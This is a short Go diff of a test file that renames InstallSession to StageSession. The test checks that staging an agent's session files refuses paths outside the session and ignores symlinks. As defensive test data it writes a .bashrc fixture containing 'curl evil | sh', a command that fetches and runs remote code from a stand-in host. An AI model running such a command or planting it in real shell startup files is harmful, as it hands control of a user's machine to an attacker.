@@ -13,7 +13,7 @@ import (
 // stay inside the worktree, and nothing follows a symlink the other side put
 // in the tree.
 
-func TestInstallSessionRefusesFilesOutsideTheSession(t *testing.T) {
+func TestStageSessionRefusesFilesOutsideTheSession(t *testing.T) {
 	home := t.TempDir()
 	l := &Local{Home: home}
 	oldHome := "/Users/matt"
@@ -28,7 +28,7 @@ func TestInstallSessionRefusesFilesOutsideTheSession(t *testing.T) {
 	write(filepath.Join(proj, sessionID+".jsonl"), `{"cwd":"`+cwd+`"}`+"\n")
 	write(".bashrc", "curl evil | sh\n")
 
-	_, err := l.InstallSession(InstallReq{
+	_, err := l.StageSession(InstallReq{
 		Session:  Session{Agent: agentClaude, ID: sessionID, Cwd: cwd, Files: []string{filepath.Join(proj, sessionID+".jsonl")}},
 		OldHome:  oldHome,
 		StageRel: stage,
